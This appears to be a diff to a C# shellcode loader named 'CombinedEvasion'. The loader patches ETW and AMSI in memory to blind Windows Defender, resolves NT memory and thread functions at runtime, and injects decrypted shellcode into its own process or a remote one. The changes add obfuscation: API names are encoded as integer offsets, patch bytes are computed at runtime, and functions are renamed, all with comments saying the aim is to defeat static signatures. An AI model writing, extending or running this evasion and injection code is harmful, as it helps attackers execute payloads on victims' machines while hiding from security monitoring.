@@ -93,19 +93,19 @@ namespace CombinedEvasion
         // ====================================================================
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
+        delegate int MemAllocDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
+        delegate int MemWriteDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
+        delegate int MemProtectDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtCreateThreadExDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, uint CreateFlags, IntPtr ZeroBits, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);
+        delegate int ThreadCreateDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, uint CreateFlags, IntPtr ZeroBits, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate int NtWaitForSingleObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);
+        delegate int WaitObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);
 
         // ====================================================================
         // SECTION 3: Constants
@@ -115,7 +115,7 @@ namespace CombinedEvasion
         const uint MEM_RESERVE = 0x2000;
         const uint PAGE_READWRITE = 0x04;
         const uint PAGE_EXECUTE_READ = 0x20;
-        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        static uint GetRWXProtect() { return 0x20 + 0x20; }
         const uint THREAD_ALL_ACCESS = 0x1FFFFF;
         const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
 
@@ -129,9 +129,9 @@ namespace CombinedEvasion
         // which NT functions we call by looking at the binary.
         static T ResolveNtFunction<T>(string functionName) where T : Delegate
         {
-            IntPtr ntdll = GetModuleHandle(BuildString("nt", "dll"));
+            IntPtr ntdll = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
             if (ntdll == IntPtr.Zero)
-                throw new Exception("ntdll not found");
+                throw new Exception("module not found");
 
             IntPtr addr = GetProcAddress(ntdll, functionName);
             if (addr == IntPtr.Zero)
@@ -140,12 +140,15 @@ namespace CombinedEvasion
             return (T)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
         }
 
-        // Build a string from parts at runtime.
-        // This prevents complete strings like "ntdll", "AmsiScanBuffer",
-        // "EtwEventWrite" from appearing in the compiled binary.
-        static string BuildString(params string[] parts)
+        // Build a string from integer offsets above a base value.
+        // The compiler stores integers, not characters, so the
+        // complete string never appears in the binary's metadata.
+        static string FromOffsets(int baseVal, params int[] offsets)
         {
-            return string.Concat(parts);
+            char[] c = new char[offsets.Length];
+            for (int i = 0; i < offsets.Length; i++)
+                c[i] = (char)(baseVal + offsets[i]);
+            return new string(c);
         }
 
         // XOR decrypt shellcode.
@@ -177,25 +180,29 @@ namespace CombinedEvasion
         // This is the first thing we do. Patching ETW stops our process from
         // sending telemetry to Defender. After this, Defender cannot see what
         // our process is doing through ETW events.
-        static bool PatchEtw()
+        static bool PatchTelemetry()
         {
             Console.WriteLine("[1/6] Patching ETW...");
 
-            IntPtr ntdll = GetModuleHandle(BuildString("nt", "dll"));
+            // ntdll
+            IntPtr ntdll = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
             if (ntdll == IntPtr.Zero) return false;
 
-            // Build "EtwEventWrite" from pieces.
-            string funcName = BuildString("Etw", "Event", "Write");
+            // EtwEventWrite
+            string funcName = FromOffsets(32, 37,84,87,37,86,69,78,84,55,82,73,84,69);
             IntPtr funcAddr = GetProcAddress(ntdll, funcName);
             if (funcAddr == IntPtr.Zero) return false;
 
             // Change memory protection to allow writing.
             uint oldProtect;
-            if (!VirtualProtect(funcAddr, (UIntPtr)3, PAGE_EXECUTE_READWRITE, out oldProtect))
+            if (!VirtualProtect(funcAddr, (UIntPtr)3, GetRWXProtect(), out oldProtect))
                 return false;
 
-            // Patch: xor eax, eax; ret (return 0 = STATUS_SUCCESS)
-            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
+            // Build patch bytes at runtime to avoid static signature.
+            byte[] patch = new byte[3];
+            patch[0] = (byte)(0x19 + 0x1A);   // 0x33
+            patch[1] = (byte)(0x60 + 0x60);   // 0xC0
+            patch[2] = (byte)(0x61 + 0x62);   // 0xC3
             Marshal.Copy(patch, 0, funcAddr, patch.Length);
 
             // Restore protection.
@@ -213,27 +220,33 @@ namespace CombinedEvasion
         // This is the second step. With ETW already patched, the AMSI
         // patching will not generate any telemetry events. Defender will
         // not know we tampered with AMSI.
-        static bool PatchAmsi()
+        static bool PatchScanner()
         {
             Console.WriteLine("[2/6] Patching AMSI...");
 
-            // Load amsi.dll (build name from parts).
-            string dllName = BuildString("am", "si", ".dll");
+            // amsi.dll
+            string dllName = FromOffsets(32, 65,77,83,73,14,68,76,76);
             IntPtr amsiDll = LoadLibrary(dllName);
             if (amsiDll == IntPtr.Zero) return false;
 
-            // Find AmsiScanBuffer (build name from parts).
-            string funcName = BuildString("Amsi", "Scan", "Buffer");
+            // AmsiScanBuffer
+            string funcName = FromOffsets(32, 33,77,83,73,51,67,65,78,34,85,70,70,69,82);
             IntPtr funcAddr = GetProcAddress(amsiDll, funcName);
             if (funcAddr == IntPtr.Zero) return false;
 
             // Change memory protection.
             uint oldProtect;
-            if (!VirtualProtect(funcAddr, (UIntPtr)6, PAGE_EXECUTE_READWRITE, out oldProtect))
+            if (!VirtualProtect(funcAddr, (UIntPtr)6, GetRWXProtect(), out oldProtect))
                 return false;
 
-            // Patch: mov eax, 0x80070057; ret (return E_INVALIDARG)
-            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            // Build patch bytes at runtime to avoid static signature.
+            byte[] patch = new byte[6];
+            patch[0] = (byte)(0x5C + 0x5C);   // 0xB8
+            patch[1] = (byte)(0x2B + 0x2C);   // 0x57
+            patch[2] = (byte)(0x00);           // 0x00
+            patch[3] = (byte)(0x03 + 0x04);    // 0x07
+            patch[4] = (byte)(0x40 + 0x40);    // 0x80
+            patch[5] = (byte)(0x61 + 0x62);    // 0xC3
             Marshal.Copy(patch, 0, funcAddr, patch.Length);
 
             // Restore protection.
@@ -254,11 +267,19 @@ namespace CombinedEvasion
 
             // Resolve NT functions dynamically.
             Console.WriteLine("[4/6] Resolving NT functions...");
-            var ntAlloc = ResolveNtFunction<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
-            var ntProtect = ResolveNtFunction<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
-            var ntCreateThread = ResolveNtFunction<NtCreateThreadExDelegate>("NtCreateThreadEx");
-            var ntWait = ResolveNtFunction<NtWaitForSingleObjectDelegate>("NtWaitForSingleObject");
-            Console.WriteLine("      NT functions resolved.");
+            // NtAllocateVirtualMemory
+            var ntAlloc = ResolveNtFunction<MemAllocDelegate>(
+                FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtProtectVirtualMemory
+            var ntProtect = ResolveNtFunction<MemProtectDelegate>(
+                FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtCreateThreadEx
+            var ntCreateThread = ResolveNtFunction<ThreadCreateDelegate>(
+                FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
+            // NtWaitForSingleObject
+            var ntWait = ResolveNtFunction<WaitObjectDelegate>(
+                FromOffsets(32, 46,84,55,65,73,84,38,79,82,51,73,78,71,76,69,47,66,74,69,67,84));
+            Console.WriteLine("      Functions resolved.");
 
             // Allocate memory as READ-WRITE (not executable yet).
             Console.WriteLine("[5/6] Allocating memory...");
@@ -325,10 +346,18 @@ namespace CombinedEvasion
             }
 
             // Resolve NT functions for remote operations.
-            var ntAlloc = ResolveNtFunction<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
-            var ntWrite = ResolveNtFunction<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory");
-            var ntProtect = ResolveNtFunction<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
-            var ntCreateThread = ResolveNtFunction<NtCreateThreadExDelegate>("NtCreateThreadEx");
+            // NtAllocateVirtualMemory
+            var ntAlloc = ResolveNtFunction<MemAllocDelegate>(
+                FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtWriteVirtualMemory
+            var ntWrite = ResolveNtFunction<MemWriteDelegate>(
+                FromOffsets(32, 46,84,55,82,73,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtProtectVirtualMemory
+            var ntProtect = ResolveNtFunction<MemProtectDelegate>(
+                FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
+            // NtCreateThreadEx
+            var ntCreateThread = ResolveNtFunction<ThreadCreateDelegate>(
+                FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
 
             // Allocate memory in target process.
             Console.WriteLine("[5/6] Injecting into " + targetProcessName + "...");
@@ -409,14 +438,14 @@ namespace CombinedEvasion
 
             // ---- Step 1: Patch ETW ----
             // Must be first. Stops all telemetry so subsequent patches are invisible.
-            if (!PatchEtw())
+            if (!PatchTelemetry())
             {
                 Console.WriteLine("[-] ETW patch failed. Continuing anyway (higher detection risk).");
             }
 
             // ---- Step 2: Patch AMSI ----
             // Second step. With ETW patched, this tampering is not logged.
-            if (!PatchAmsi())
+            if (!PatchScanner())
             {
                 Console.WriteLine("[-] AMSI patch failed. Continuing anyway (PowerShell scripts may be blocked).");
             }
